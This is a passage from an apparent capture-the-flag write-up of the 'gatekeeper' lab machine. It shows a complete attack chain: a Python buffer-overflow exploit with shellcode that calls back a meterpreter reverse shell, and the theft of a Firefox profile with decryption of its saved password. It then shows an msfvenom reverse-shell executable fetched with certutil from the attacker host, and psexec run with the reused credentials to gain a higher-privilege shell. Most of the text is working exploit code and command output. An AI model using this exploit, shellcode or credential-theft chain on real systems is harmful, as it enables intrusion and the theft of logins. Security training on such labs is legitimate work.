buf += b"\x25\x4d\x17\xad\xdb\x6e\x67\xe7\x1f\x3a\x37\x9f\xb6"
buf += b"\x43\xdc\x5f\x36\x96\x48\x6a\xa0\x13\x85\x6a\xbc\x4c"
buf += b"\x97\x6a\xb9\xb5\x1e\x8c\x91\x95\x70\x01\x52\x46\x30"
buf += b"\xf1\x3a\x8c\xbf\x2e\x5a\xaf\x6a\x47\xf1\x40\xc2\x3f"
buf += b"\x6e\xf8\x4f\xcb\x0f\x05\x5a\xb1\x10\x8d\x6e\x45\xde"
buf += b"\x66\x1b\x55\x37\x11\xe3\xa5\xc8\xb4\xe3\xcf\xcc\x1e"
buf += b"\xb4\x67\xcf\x47\xf2\x27\x30\xa2\x81\x20\xce\x33\xb3"
buf += b"\x5b\xf9\xa1\xfb\x33\x06\x26\xfb\xc3\x50\x2c\xfb\xab"
buf += b"\x04\x14\xa8\xce\x4a\x81\xdd\x42\xdf\x2a\xb7\x37\x48"
buf += b"\x43\x35\x61\xbe\xcc\xc6\x44\xbc\x0b\x38\x1a\xeb\xb3"
buf += b"\x50\xe4\xab\x43\xa0\x8e\x2b\x14\xc8\x45\x03\x9b\x38"
buf += b"\xa5\x8e\xf4\x50\x2c\x5f\xb6\xc1\x31\x4a\x16\x5f\x31"
buf += b"\x79\x83\x50\x48\xf2\x34\x91\xad\x1a\x51\x92\xad\x22"
buf += b"\x67\xaf\x7b\x1b\x1d\xee\xbf\x18\x2e\x45\x9d\x09\xa5"
buf += b"\xa5\xb1\x4a\xec"
 
```

We configure metasploit to catch the connection:
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf6 exploit(multi/handler) > set LHOST 10.9.0.140
LHOST => 10.9.0.140
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.9.0.140:1337
```

Run the exploit again:
```
└─$ ./exploit.py
Sending evil buffer...
Done!

```

We see that we get a meterpreter session:
```
[*] Sending stage (175174 bytes) to 10.10.35.92
[*] Meterpreter session 1 opened (10.9.0.140:1337 -> 10.10.35.92:49198) at 2021-03-05 20:23:29 -0500
meterpreter >
```

We download the profile at:
```
meterpreter > download "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release"
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
meterpreter > download ljfn812a.default-release 
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.files -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.files -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite

[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb -> ljfn812a.default-release/storage/permanent/chrome/idb
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome -> ljfn812a.default-release/storage/permanent/chrome
[*] mirrored   : ljfn812a.default-release\storage\permanent -> ljfn812a.default-release/storage/permanent
[*] mirroring  : ljfn812a.default-release\storage\temporary -> ljfn812a.default-release/storage/temporary
[*] mirrored   : ljfn812a.default-release\storage\temporary -> ljfn812a.default-release/storage/temporary
[*] mirrored   : ljfn812a.default-release\storage -> ljfn812a.default-release/storage
[*] downloading: ljfn812a.default-release\storage.sqlite -> ljfn812a.default-release/storage.sqlite
[*] download   : ljfn812a.default-release\storage.sqlite -> ljfn812a.default-release/storage.sqlite
[*] downloading: ljfn812a.default-release\times.json -> ljfn812a.default-release/times.json
[*] download   : ljfn812a.default-release\times.json -> ljfn812a.default-release/times.json
[*] downloading: ljfn812a.default-release\TRRBlacklist.txt -> ljfn812a.default-release/TRRBlacklist.txt
[*] download   : ljfn812a.default-release\TRRBlacklist.txt -> ljfn812a.default-release/TRRBlacklist.txt
[*] mirroring  : ljfn812a.default-release\weave -> ljfn812a.default-release/weave
[*] mirroring  : ljfn812a.default-release\weave\failed -> ljfn812a.default-release/weave/failed
[*] downloading: ljfn812a.default-release\weave\failed\tabs.json -> ljfn812a.default-release/weave/failed/tabs.json
[*] download   : ljfn812a.default-release\weave\failed\tabs.json -> ljfn812a.default-release/weave/failed/tabs.json
[*] mirrored   : ljfn812a.default-release\weave\failed -> ljfn812a.default-release/weave/failed
[*] mirroring  : ljfn812a.default-release\weave\toFetch -> ljfn812a.default-release/weave/toFetch
[*] downloading: ljfn812a.default-release\weave\toFetch\tabs.json -> ljfn812a.default-release/weave/toFetch/tabs.json
[*] download   : ljfn812a.default-release\weave\toFetch\tabs.json -> ljfn812a.default-release/weave/toFetch/tabs.json
[*] mirrored   : ljfn812a.default-release\weave\toFetch -> ljfn812a.default-release/weave/toFetch
[*] mirrored   : ljfn812a.default-release\weave -> ljfn812a.default-release/weave
[*] downloading: ljfn812a.default-release\webappsstore.sqlite -> ljfn812a.default-release/webappsstore.sqlite
[*] download   : ljfn812a.default-release\webappsstore.sqlite -> ljfn812a.default-release/webappsstore.sqlite
[*] downloading: ljfn812a.default-release\xulstore.json -> ljfn812a.default-release/xulstore.json
[*] download   : ljfn812a.default-release\xulstore.json -> ljfn812a.default-release/xulstore.json
meterpreter >
meterpreter > 
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.files -> ljfn812a.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.files -> ljfn812a.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\1451318868ntouromlalnodry--epcr.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.files -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.files -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\1657114595AmcateirvtiSty.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\2823318777ntouromlalnodry--naod.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.files -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\2918063365piupsah.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\3561288849sdhlie.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
[*] mirroring  : ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.files
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.files -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.files
[*] downloading: ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
[*] download   : ljfn812a.default-release\storage\permanent\chrome\idb\3870112724rsegmnoittet-es.sqlite -> ljfn812a.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome\idb -> ljfn812a.default-release/storage/permanent/chrome/idb
[*] mirrored   : ljfn812a.default-release\storage\permanent\chrome -> ljfn812a.default-release/storage/permanent/chrome
[*] mirrored   : ljfn812a.default-release\storage\permanent -> ljfn812a.default-release/storage/permanent
[*] mirroring  : ljfn812a.default-release\storage\temporary -> ljfn812a.default-release/storage/temporary
[*] mirrored   : ljfn812a.default-release\storage\temporary -> ljfn812a.default-release/storage/temporary
[*] mirrored   : ljfn812a.default-release\storage -> ljfn812a.default-release/storage
[*] downloading: ljfn812a.default-release\storage.sqlite -> ljfn812a.default-release/storage.sqlite
[*] download   : ljfn812a.default-release\storage.sqlite -> ljfn812a.default-release/storage.sqlite
[*] downloading: ljfn812a.default-release\times.json -> ljfn812a.default-release/times.json
[*] download   : ljfn812a.default-release\times.json -> ljfn812a.default-release/times.json
[*] downloading: ljfn812a.default-release\TRRBlacklist.txt -> ljfn812a.default-release/TRRBlacklist.txt
[*] download   : ljfn812a.default-release\TRRBlacklist.txt -> ljfn812a.default-release/TRRBlacklist.txt
[*] mirroring  : ljfn812a.default-release\weave -> ljfn812a.default-release/weave
[*] mirroring  : ljfn812a.default-release\weave\failed -> ljfn812a.default-release/weave/failed
[*] downloading: ljfn812a.default-release\weave\failed\tabs.json -> ljfn812a.default-release/weave/failed/tabs.json
[*] download   : ljfn812a.default-release\weave\failed\tabs.json -> ljfn812a.default-release/weave/failed/tabs.json
[*] mirrored   : ljfn812a.default-release\weave\failed -> ljfn812a.default-release/weave/failed
[*] mirroring  : ljfn812a.default-release\weave\toFetch -> ljfn812a.default-release/weave/toFetch
[*] downloading: ljfn812a.default-release\weave\toFetch\tabs.json -> ljfn812a.default-release/weave/toFetch/tabs.json
[*] download   : ljfn812a.default-release\weave\toFetch\tabs.json -> ljfn812a.default-release/weave/toFetch/tabs.json
[*] mirrored   : ljfn812a.default-release\weave\toFetch -> ljfn812a.default-release/weave/toFetch
[*] mirrored   : ljfn812a.default-release\weave -> ljfn812a.default-release/weave
[*] downloading: ljfn812a.default-release\webappsstore.sqlite -> ljfn812a.default-release/webappsstore.sqlite
[*] download   : ljfn812a.default-release\webappsstore.sqlite -> ljfn812a.default-release/webappsstore.sqlite
[*] downloading: ljfn812a.default-release\xulstore.json -> ljfn812a.default-release/xulstore.json
[*] download   : ljfn812a.default-release\xulstore.json -> ljfn812a.default-release/xulstore.json
...
```

We use Dumpzilla to decode the passwords:
```
python3 dumpzilla/dumpzilla.py ljfn812a.default-release --Passwords

=============================================================================================================
== Decode Passwords     
============================================================================================================
=> Source file: /home/ttl0/ljfn812a.default-release/logins.json
=> SHA256 hash: 6e70ab4dc25ce7fe065370a738d1411b27201f941299ffff702bda74f8dcc33c

Web: https://creds.com
Username: mayor
Password: 8CL7O1N78MdrCIsV


=============================================================================================================
== Passwords            
============================================================================================================
=> Source file: /home/ttl0/ljfn812a.default-release/logins.json
=> SHA256 hash: 6e70ab4dc25ce7fe065370a738d1411b27201f941299ffff702bda74f8dcc33c

Web: https://creds.com
User field: 
Password field: 
User login (crypted): MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==
Password login (crypted): MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=
Created: 2020-04-21 17:02:11
Last used: 2020-04-21 17:02:11
Change: 2020-05-14 22:43:45
Frequency: 1


===============================================================================================================
== Total Information
==============================================================================================================

Total Decode Passwords     : 1
Total Passwords            : 1

```

I downloaded dumpzilla from "https://github.com/Busindre/dumpzilla/blob/master/dumpzilla.py" but had to modify line 125 to point to my own libnss3.so path:
```
125         libnss_path = "/usr/lib/x86_64-linux-gnu/libnss3.so"  
```

We create a shell with msfvenom to elevate privilege:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.140 LPORT=1338 -e x86/shikata_ga_nai -f exe -o shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

We download to the box psexec and a shell.exe to spawn it with elevated privileges:
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>cd "C:\Users\natbat"
cd "C:\Users\natbat"

C:\Users\natbat>certutil -urlcache -f -split http://10.9.0.140/PsExec.exe psexec.exe
certutil -urlcache -f -split http://10.9.0.140/PsExec.exe psexec.exe
****  Online  ****
  000000  ...
  0cbb78
CertUtil: -URLCache command completed successfully.
C:\Users\natbat>certutil -urlcache -f -split http://10.9.0.140/shell.exe shell.exe
certutil -urlcache -f -split http://10.9.0.140/shell.exe shell.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

```

Start a netcat listener to catch the shell on port 1338:
```
nc -lvnp 1338
listening on [any] 1338 ...

```

Start the shell with elevated privileges:
```
psexec.exe /accepteula -u "DOMAIN\mayor" -p "8CL7O1N78MdrCIsV" shell.exe
```

We get a shell as user mayor:
```
listening on [any] 1338 ...
connect to [10.9.0.140] from (UNKNOWN) [10.10.35.92] 49208
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
gatekeeper\mayor

```

**Vulnerability Exploited:**
Browser passwords decoding and password re-use.

**Vulnerability Explanation:**
If an attacker can get access to a user's Firefox browser profile folder and he has saved passwords, he can retrieve these credentials and decrypt them. If the user uses the same credentials for local access, he can re-use these credentials to escalate privilege to this user.

**Vulnerability Fix:**
Do not save passwords in Firefox browser or do not re-use the same credentials for windows access.

**Severity:**
High

**Exploit Code:**
Modified shellcode to spawn meterpreter shell
```
#!/usr/bin/env python2.7
import socket

ip = "10.10.35.92"
port = 31337

offset = 146 
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 32
postfix = ""
buf =  b""
buf += b"\xdb\xc3\xd9\x74\x24\xf4\x5e\xbf\x27\x38\xb5\x2e\x31"
buf += b"\xc9\xb1\x59\x31\x7e\x19\x03\x7e\x19\x83\xee\xfc\xc5"
buf += b"\xcd\x49\xc6\x86\x2e\xb2\x17\xf8\xa7\x57\x26\x2a\xd3"
buf += b"\x1c\x1b\xfa\x97\x71\x90\x71\xf5\x61\xa7\x32\xb0\xaf"
buf += b"\x3c\x4e\x6d\x81\xbd\x9f\xad\x4d\x7d\xbe\x51\x8c\x52"
buf += b"\x60\x6b\x5f\xa7\x61\xac\x29\xcd\x8e\x60\xfd\xa6\x02"
buf += b"\x95\x8a\xfb\x9e\x94\x5c\x70\x9e\xee\xd9\x47\x6a\x43"
buf += b"\xe3\x97\x19\x03\xc3\x9c\x55\xac\x02\x70\x35\x49\xcd"
buf += b"\x02\x89\x60\x31\xa3\x7a\xb6\x46\x35\xaa\x86\x98\xf7"
buf += b"\x9d\xe4\xb4\xf9\xe6\xcf\x24\x8c\x1c\x2c\xd8\x97\xe7"
buf += b"\x4e\x06\x1d\xf7\xe9\xcd\x85\xd3\x08\x01\x53\x90\x07"
buf += b"\xee\x17\xfe\x0b\xf1\xf4\x75\x37\x7a\xfb\x59\xb1\x38"
buf += b"\xd8\x7d\x99\x9b\x41\x24\x47\x4d\x7d\x36\x2f\x32\xdb"
buf += b"\x3d\xc2\x25\x5b\xbe\x1c\x4a\x01\x28\xd0\x87\xba\xa8"
buf += b"\x7e\x9f\xc9\x9a\x21\x0b\x46\x96\xaa\x95\x91\xaf\xbd"
buf += b"\x25\x4d\x17\xad\xdb\x6e\x67\xe7\x1f\x3a\x37\x9f\xb6"
buf += b"\x43\xdc\x5f\x36\x96\x48\x6a\xa0\x13\x85\x6a\xbc\x4c"
buf += b"\x97\x6a\xb9\xb5\x1e\x8c\x91\x95\x70\x01\x52\x46\x30"
buf += b"\xf1\x3a\x8c\xbf\x2e\x5a\xaf\x6a\x47\xf1\x40\xc2\x3f"
buf += b"\x6e\xf8\x4f\xcb\x0f\x05\x5a\xb1\x10\x8d\x6e\x45\xde"
buf += b"\x66\x1b\x55\x37\x11\xe3\xa5\xc8\xb4\xe3\xcf\xcc\x1e"
buf += b"\xb4\x67\xcf\x47\xf2\x27\x30\xa2\x81\x20\xce\x33\xb3"
buf += b"\x5b\xf9\xa1\xfb\x33\x06\x26\xfb\xc3\x50\x2c\xfb\xab"
buf += b"\x04\x14\xa8\xce\x4a\x81\xdd\x42\xdf\x2a\xb7\x37\x48"
buf += b"\x43\x35\x61\xbe\xcc\xc6\x44\xbc\x0b\x38\x1a\xeb\xb3"
buf += b"\x50\xe4\xab\x43\xa0\x8e\x2b\x14\xc8\x45\x03\x9b\x38"
buf += b"\xa5\x8e\xf4\x50\x2c\x5f\xb6\xc1\x31\x4a\x16\x5f\x31"
buf += b"\x79\x83\x50\x48\xf2\x34\x91\xad\x1a\x51\x92\xad\x22"
buf += b"\x67\xaf\x7b\x1b\x1d\xee\xbf\x18\x2e\x45\x9d\x09\xa5"
buf += b"\xa5\xb1\x4a\xec"



buffer = overflow + retn + padding + buf + postfix


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")

```

**Proof Screenshot Here:**

![](Pasted image 20210306124128.png)

**Proof.txt Contents:**

```
C:\Users\mayor\Desktop>Hostname && echo %username% && type "C:\Users\mayor\Desktop\root.txt.txt" && ipconfig /all
Hostname && echo %username% && type "C:\Users\mayor\Desktop\root.txt.txt" && ipconfig /all
gatekeeper
mayor 
{Th3_M4y0r_C0ngr4tul4t3s_U}
Windows IP Configuration

   Host Name . . . . . . . . . . . . : gatekeeper
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.compute.internal

Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-8B-CE-41-EA-93
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::b19d:4b29:5ccb:6917%17(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.35.92(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, March 06, 2021 12:00:07 PM
   Lease Expires . . . . . . . . . . : Saturday, March 06, 2021 1:30:07 PM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 285663925
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-2E-56-91-00-0C-29-C1-C1-82
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes


```